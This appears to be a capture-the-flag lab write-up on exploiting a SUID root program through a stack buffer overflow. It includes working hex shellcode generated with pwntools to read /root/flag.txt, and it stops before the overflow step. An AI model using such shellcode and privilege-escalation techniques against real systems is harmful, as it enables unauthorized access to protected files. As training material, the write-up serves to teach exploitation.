## Background: 

We've recycled a password to SSH into annother Linux machine during a pen test.

We login with a standard access account, htb-student. The program leave_msg allows us to leave a message for an admin.

We see that these messages are stored in "/htb-student/msg.txt," which is binary owned by the user root, and the SUID bit is set.

Let's see if we can exploit the program with Stack-Based Buffer Overflow to read the file "/root/flag.txt".

## Shellcode:

First lets start by generating shell code that can cat a file.

- We can use pwntools for this: https://docs.pwntools.com/en/stable/shellcraft/aarch64.html#pwnlib.shellcraft.aarch64.linux.cat

We'll need to make a flag to test the code:

    echo "HTB{f4lS3_fLag}" > flag.txt

Now use shellcodePwn.py to generatecode to read the file "flag.txt":

    ./shellcodePwn.py 
    6a01fe0c2448b8666c61672e747874506a02584889e731f60f0541baffffff7f4889c66a28586a015f990f05

Next, we'll test it:

    ./shellcodeRun.py -s 6a01fe0c2448b8666c61672e747874506a02584889e731f60f0541baffffff7f4889c66a28586a015f990f05
    Shellcode Output:
    HTB{f4lS3_fLag}

Now that it works, update "shellcodePwn.py" to read "/root/flag.txt":

    ./shellcodePwn.py 
    48b801010101010101015048b860662f75797501014831042448b82f726f6f742f666c506a02584889e731f60f0541baffffff7f4889c66a28586a015f990f05

# Inspect Binary:

The first thing we need to be aware of is this server is using python2, so we'll need to adjust our commands accordingly.

    $ python --version
    Python 2.7.17




